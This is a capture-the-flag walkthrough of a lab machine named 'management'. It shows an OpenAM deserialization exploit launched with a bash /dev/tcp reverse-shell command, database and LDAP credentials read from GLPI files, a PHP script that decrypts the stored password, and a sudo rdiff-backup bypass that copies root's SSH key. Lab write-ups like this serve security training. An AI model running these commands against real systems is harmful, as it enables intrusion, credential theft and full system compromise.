

<img src="Images/Pasted%20image%2020260915113710.png" width="302" alt="Pasted image 20260915113710">

# Attack Chain



# Summary

- [Enumeration](#enumeration)
- [Web](#web)
- [CVE-2026-33439](#cve-2026-33439)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

---
# Enumeration

```
nmap -sVC 10.129.*.* -oA scan/management

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
|_  256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.*.*/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Did not follow redirect to https://management.htb/
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
4444/tcp  open  ssl/ldap
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings:
|   LDAPSearchReq:
|     0<0:
|     objectClass1+
|     ds-root-dse
|     ds-cfg-root-dse-backend0
|   RPCCheck:
|     qCannot decode the ASN.1 element because an unexpected end of file was reached while reading the first length byte
|     1.3.6.1.4.1.1466.20036
|   TLSSessionReq:
|     Cannot decode the provided ASN.1 integer element because the length of the element value was not between one and four bytes (actual length was 0)
|_    1.3.6.1.4.1.1466.20036
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Not valid before: 2026-06-02T01:23:59
|_Not valid after:  2046-05-28T01:23:59
50389/tcp open  ldap     (Anonymous bind OK)
```

> [!NOTE]
> **Observations**
> - Web site on port 80/443
> - ldap is in use and anonymous bind is enabled

```
echo '10.129.62.95 management.htb' | tee -a /etc/hosts
```

# Web

![Pasted image 20260915120549](Images/Pasted%20image%2020260915120549.png)

Clicking on **Client login** redirects us to `https://sso.management.htb`.

```
echo '10.129.62.95 sso.management.htb' | tee -a /etc/hosts
```


![Pasted image 20260915121217](Images/Pasted%20image%2020260915121217.png)

We land on an **OpenAM** login form, and we can identify the version in the page source.

![Pasted image 20260915121336](Images/Pasted%20image%2020260915121336.png)

# CVE-2026-33439

This version of OpenAM is vulnerable to **CVE-2026-33439**, a pre-authentication Remote Code Execution via `jato.clientSession` deserialization in OpenAM. (The technique is the same class of bug as the well-known ForgeRock AM Jato/`ClientSession` deserialization flaw, CVE-2021-35464, an untrusted Java object embedded in a request parameter is deserialized before authentication.)

We can use this [repository](https://github.com/TheMalwareGuardian/CVE-2026-33439) to exploit the CVE.

First we start a listener.

```
penelope -i tun0 -p 6767
```

Then we run the following exploit from within the **Exploit** folder.

```
python3 Exploit_CVE_2026_33439.py --url 'https://sso.management.htb/openam/' --command "bash -i >& /dev/tcp/10.10.*.*/6767 0>&1" --jars Jars
```

We should get a connection back on our listener.

```
[+] Got reverse shell from management 10.129.*.* Linux-x86_64 👤 openam(996) • Assigned SessionID <1>
[+] Shell upgraded successfully using /usr/bin/python3
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /root/.penelope/sessions/management~10.129.*.*-Linux-x86_64/2026_09_15-12_23_12-434.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
openam@management:/$
```

# Lateral Movement

Under `/opt`, we notice that GLPI is installed on the target. Digging further, we can inspect the database configuration file.

```
openam@management:/opt/glpi/config$ cat config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

With this information, we can connect to MariaDB.

```
openam@management:/opt/glpi/config$ mysql -u glpi -p8rhu0L6Pw4Y7

<SNIP>

MariaDB [(none)]> use glpidb
```

And extract the password used by the GLPI service account to authenticate over LDAP.

```
MariaDB [glpidb]> select rootdn, rootdn_passwd from glpi_authldaps;

+----------------------------------------------+--------------------------------------------------------------------------+
| rootdn                                       | rootdn_passwd                                                            |
+----------------------------------------------+--------------------------------------------------------------------------+
| cn=svc-glpi,ou=services,dc=management,dc=htb | avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw== |
+----------------------------------------------+--------------------------------------------------------------------------+
1 row in set (0.001 sec)
```

The password is stored encrypted, but **reversibly**. GLPI has to recover the cleartext to bind to the LDAP directory, so the key lives on the box. Since GLPI 9.5, that encryption is `sodium_crypto_aead_xchacha20poly1305_ietf` with the key stored in `config/glpicrypt.key`. The stored value is `base64(nonce[24] || ciphertext || tag[16])`, so we decrypt it with the following PHP script.

```
openam@management:/opt/glpi$ php -r '
$key = file_get_contents("/opt/glpi/config/glpicrypt.key");
$enc = base64_decode("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==");
$nonce = substr($enc, 0, 24);
$ct    = substr($enc, 24);
$p = @sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ct, $nonce, $nonce, $key);
var_dump($p);
'

string(12) "WpczC40GhTbk"
```

We successfully decrypted the password, and it is reused for the user `owen` on the target.

```
ssh owen@10.129.62.95
owen@10.129.62.95's password: WpczC40GhTbk

<SNIP>

owen@management:~$
```

# Privilege Escalation

## Privileges enumeration

First, let's enumerate our privileges.

```
owen@management:~$ sudo -l
Matching Defaults entries for owen on management:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

`owen` can run `rdiff-backup` as root, but only in a constrained form. To see why this is still exploitable, we need to understand how `rdiff-backup` works in remote mode.

## Explanation

`rdiff-backup` is a **client/server** tool. When you back up or restore over a network, one side acts as the **client** and the other as the **server** (started with `--server`). The two processes talk to each other over the server's stdin/stdout using `rdiff-backup`'s own protocol. By default the client spawns the server through SSH, using a template called the **remote schema**:

```
ssh -C %s rdiff-backup --server
```

At runtime, `%s` is replaced by the host part of a `host::/path` location. Two facts matter here:
- All the security restrictions (`--restrict-path`, `--restrict-mode`) are enforced by the **server** side.
- The **client** is entirely under our control, including how the server is launched, via `--remote-schema`.

So if we replace the SSH schema with our own `sudo` line, the "server" is no longer a remote SSH host: it becomes a **root process on the same machine**.

Two properties of the rule make it abusable:

1. **The trailing `*`.** The rule pins the start of the command but lets us append arbitrary arguments. `rdiff-backup` parses its options with argparse, where a repeated option keeps the **last** value. Appending a second `--restrict-path /` therefore overrides the intended `/opt/backup` sandbox and gives the root server access to the whole filesystem.
2. **`read-only` only blocks writes on the server.** It stops the root server from _writing_ to disk, but not from _reading_. If we make the root server the **source** of a backup (reading `/root`) and our own directory the **destination** (which `owen` is allowed to write), the read-only restriction is fully satisfied and we never ask the server to write anything.

## Exploitation

To perform the action, we can run the following command

```
rdiff-backup --remote-schema \
  'bash -c "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /" bash %s' \
  localhost::/root /tmp/root_copy
```

And we can find `root.txt` and root's private SSH key under `/tmp/root_copy`.

```
owen@management:~$ ls -la /tmp/root_copy/
total 44
drwx------  7 owen owen 4096 Sep 15 09:45 .
drwxrwxrwt 18 root root 4096 Sep 15 12:47 ..
lrwxrwxrwx  1 owen owen    9 Sep 15 12:41 .bash_history -> /dev/null
-rw-r--r--  1 owen owen 3106 Apr 22  2024 .bashrc
drwx------  3 owen owen 4096 Sep  7 11:41 .cache
drwx------  3 owen owen 4096 Sep  7 11:41 .config
drwxr-xr-x  3 owen owen 4096 Sep  7 11:41 .local
-rw-r--r--  1 owen owen  161 Apr 22  2024 .profile
drwx------  3 owen owen 4096 Sep 15 12:48 rdiff-backup-data
-rw-r-----  1 owen owen   33 Sep 15 09:45 root.txt
drwx------  2 owen owen 4096 Sep  7 11:41 .ssh
-rw-r--r--  1 owen owen  177 Sep  7 11:06 .wget-hsts
```

We now have a full, owen-readable copy of `/root`, including `root.txt` and the contents of `.ssh`.

Using root's private key we can open a stable root shell instead of relying on the copied files:

```
owen@management:~$ ssh -i /tmp/root_copy/.ssh/id_rsa root@management.htb
```


> [!TIP]
> **Machine Rooted**